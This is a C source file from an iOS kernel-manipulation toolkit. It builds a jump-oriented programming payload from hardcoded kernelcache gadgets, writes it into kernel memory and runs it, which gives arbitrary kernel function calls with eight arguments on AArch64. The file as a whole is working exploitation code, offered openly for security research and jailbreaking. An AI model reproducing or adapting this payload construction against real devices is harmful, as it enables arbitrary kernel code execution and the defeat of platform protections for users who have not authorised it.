#include "aarch64/kernel_call_aarch64.h"
/*
 * AArch64 Kernel Function Call Strategy
 * -------------------------------------
 *
 *  In order to call arbitrary kernel functions with 8 64-bit arguments and get the 64-bit return
 *  value in user space, we construct a Jump-Oriented Program to perform a single function call and
 *  store the result in kernel memory.
 *
 *  We use a JOP payload rather than a ROP payload in order to preserve the kernel stack,
 *  simplifying cleanup and making the program more modular.
 *
 *  Currently the gadgets are hardcoded from specific iOS builds (for example, from the iOS 10.1.1
 *  14B100 kernelcache on n71). As such, there is no guarantee that the required gadgets will be
 *  available on other builds or platforms. In the future, I hope to implement a system of
 *  disassembling the kernelcache to look for suitable gadgets from which to build a JOP function
 *  call payload, or even create a framework to perform arbitrary computation within a JOP payload.
 *
 *  The specific JOP strategy used depends on the set of gadgets available on the target. The JOP
 *  strategies are documented in their corresponding C files.
 *
 *  Once an appropriate JOP payload has been constructed, the payload is copied into the kernel and
 *  executed using kernel_call_7.
 */

#include "memctl/core.h"
#include "memctl/kernel_call.h"
#include "memctl/kernel_memory.h"
#include "memctl/kernelcache.h"
#include "memctl/memctl_error.h"
#include "memctl/utility.h"

#include "aarch64/jop/call_strategy.h"
#include "aarch64/jop/gadgets_static.h"


_Static_assert(sizeof(kword_t) == sizeof(uint64_t),
               "unexpected kernel word size for kernel_call_aarch64");

/*
 * jop_payload
 *
 * Description:
 * 	A page of kernel memory used for the JOP payload.
 */
static kaddr_t jop_payload;

/*
 * strategies
 *
 * Description:
 * 	A list of all available strategies, sorted in order of preference.
 */
const struct jop_call_strategy *strategies[] = {
	&jop_call_strategy_1,
	&jop_call_strategy_2,
};

/*
 * strategy
 *
 * Description:
 * 	The chosen strategy.
 */
const struct jop_call_strategy *strategy;

/*
 * choose_strategy
 *
 * Description:
 * 	Choose a compatible JOP strategy.
 */
static bool
choose_strategy() {
	// Build a mask of the available gadgets.
	uint64_t available[ARRSIZE(strategy->gadgets)] = { 0 };
	for (unsigned g = 0; g < STATIC_GADGET_COUNT; g++) {
		unsigned block = g / (8 * sizeof(*strategy->gadgets));
		unsigned bit   = g % (8 * sizeof(*strategy->gadgets));
		if (static_gadgets[g].address != 0) {
			available[block] |= 1 << bit;
		} else {
			memctl_warning("gadget '%s' is missing", static_gadgets[g].str);
		}
	}
	// Test each strategy to see if all gadgets are present.
	for (size_t i = 0; i < ARRSIZE(strategies); i++) {
		strategy = strategies[i];
		for (unsigned b = 0; b < ARRSIZE(strategy->gadgets); b++) {
			if ((available[b] & strategy->gadgets[b]) != strategy->gadgets[b]) {
				goto next;
			}
		}
		return true;
next:;
	}
	strategy = NULL;
	error_functionality_unavailable("kernel_call_aarch64: no available JOP strategy "
	                                "for the gadgets present in this kernel");
	return false;
}

bool
kernel_call_init_aarch64() {
	if (jop_payload != 0) {
		return true;
	}
	if (!find_static_gadgets()) {
		goto fail;
	}
	if (!choose_strategy()) {
		goto fail;
	}
	if (!kernel_allocate(&jop_payload, strategy->payload_size)) {
		goto fail;
	}
	return true;
fail:
	kernel_call_deinit_aarch64();
	return false;
}

void
kernel_call_deinit_aarch64() {
	if (jop_payload != 0) {
		kernel_deallocate(jop_payload, strategy->payload_size, false);
		jop_payload = 0;
	}
}

bool
kernel_call_aarch64(void *result, unsigned result_size,
		kaddr_t func, unsigned arg_count, const struct kernel_call_argument args[]) {
	if (func == 0) {
		// Everything is supported, as long as kernel_call_aarch64 has been initialized.
		return (jop_payload != 0 && arg_count <= 8);
	}
	assert(jop_payload != 0);
	// Get exactly 8 arguments.
	uint64_t args8[8] = { 0 };
	for (size_t i = 0; i < arg_count; i++) {
		args8[i] = args[i].value;
	}
	// No stack.
	uint64_t stack8[8] = { 0 };
	// Initialize unused bytes of the payload to a distinctive byte pattern to make detecting
	// errors in panic logs easier.
	size_t size = strategy->payload_size;
	uint8_t payload[size];
	memset(payload, 0xba, size);
	// Build the payload.
	struct jop_call_initial_state initial_state;
	uint64_t result_address;
	strategy->build_jop(func, args8, stack8, jop_payload,
			payload, &initial_state, &result_address);
	// Write the payload into kernel memory.
	kernel_io_result ior = kernel_write_unsafe(jop_payload, &size, payload, 0, NULL);
	if (ior != KERNEL_IO_SUCCESS) {
		error_internal("could not write JOP payload to kernel memory");
		return false;
	}
	// Execute the payload.
	struct kernel_call_argument args7[7];
	for (size_t i = 0; i < 7; i++) {
		args7[i].size  = sizeof(initial_state.x[i]);
		args7[i].value = initial_state.x[i];
	}
	uint32_t result32;
	bool success = kernel_call_7(&result32, sizeof(result32), initial_state.pc, 7, args7);
	if (!success) {
		return false;
	}
	// Read the result from kernel memory.
	uint64_t result64;
	ior = kernel_read_word(kernel_read_unsafe, result_address, &result64, sizeof(result64), 0);
	if (ior != KERNEL_IO_SUCCESS) {
		error_internal("could not read function call result from kernel memory");
		return false;
	}
	if (result_size > 0) {
		pack_uint(result, result64, result_size);
	}
	return true;
}
